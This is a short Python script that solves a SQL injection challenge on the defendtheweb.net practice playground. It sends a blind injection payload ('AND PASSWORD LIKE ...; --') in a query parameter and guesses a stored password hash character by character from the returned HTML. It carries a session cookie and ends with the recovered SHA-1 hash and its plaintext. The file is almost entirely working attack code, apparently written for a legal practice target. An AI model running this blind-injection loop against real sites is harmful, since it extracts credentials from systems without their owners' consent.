""" A really simple and naieve script to extract the password. Gets the job done."""

from string import ascii_lowercase, ascii_uppercase, digits
import requests
from bs4 import BeautifulSoup

ROOT_URL = "https://defendtheweb.net/playground/sqli2"
COOKIES = {
    "PHPSESSID": "t9413pf5rm9ocl09vnkttrpb9a"
}
VALID_CHARS = ascii_lowercase + digits  # Turns out that we're only dealing with hex and not gen alphanumeric or base64 or something else.

def get_payload(guess):
    """ Favour a simple linear search instead of a binary search."""
    params = {
        "q": "bellamond' AND PASSWORD LIKE '{}%'; -- ".format(guess)
    }
    return params

def attack():
    f = False
    estimated_password = "1b774bc166f3f8918e900fcef8"
    while True:
        for char in VALID_CHARS:
            _estimated_password = estimated_password + char
            payload = get_payload(_estimated_password)
            print("trying: {}".format(char))
            response = requests.get(ROOT_URL, params=payload, cookies=COOKIES)
            soup = BeautifulSoup(response.content, features="lxml")
            if len([i for i in soup.find_all("ul")[13].children]) > 1:
                estimated_password += char
                print("estimated_password: {}".format(estimated_password))
                f = True
                break
        if not f:
            break
        f = False
    print("Final password: {}".format(estimated_password))
            
attack()

# final password: 1b774bc166f3f8918e900fcef8752817bae76a37 which is the SHA-1 for sup3r 
